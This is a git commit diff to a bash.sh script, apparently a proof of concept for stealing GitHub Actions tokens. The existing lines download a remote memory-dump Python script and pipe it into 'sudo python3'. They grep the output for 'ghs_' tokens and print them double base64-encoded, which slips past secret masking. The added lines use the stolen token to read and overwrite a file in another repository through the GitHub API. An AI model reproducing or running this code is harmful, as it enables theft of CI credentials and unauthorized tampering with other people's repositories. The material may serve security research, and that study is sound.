50c2ca9f256b6c25652cc5fb8443cccd6e062f1a
Victim User <46316318+r3s34rch@users.noreply.github.com>
2023-10-06 21:04:37 +0200

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,13 +1,25 @@
 #!/usr/bin/env bash
 set -e
 
-readonly REPO="thi3nl0ng.github.io"
+readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64`
 
 echo "-----------------------------------------------------------------"
 echo "${TOKEN_VAL}"
 echo "-----------------------------------------------------------------"
 
+curl \
+  -H "Accept: application/vnd.github.v3+json" \
+  -H "Authorization: token $TOKEN_VAL" \
+  "https://api.github.com/repos/${REPO}/contents/README2.md"
+
+curl \
+    -X PUT \
+    -H "Accept: application/vnd.github.v3+json" \
+    -H "Authorization: token  $TOKEN_VAL" \
+    "https://api.github.com/repos/${REPO}/contents/README2.md" \
+    -d '{"message":"message","content":"'$(echo content|base64)'", "sha":"SHA_FROM_ABOVE"}'
+            
 #gh api --silent \
 #  --method POST \
 #  -H "Accept: application/vnd.github.v3+json" \
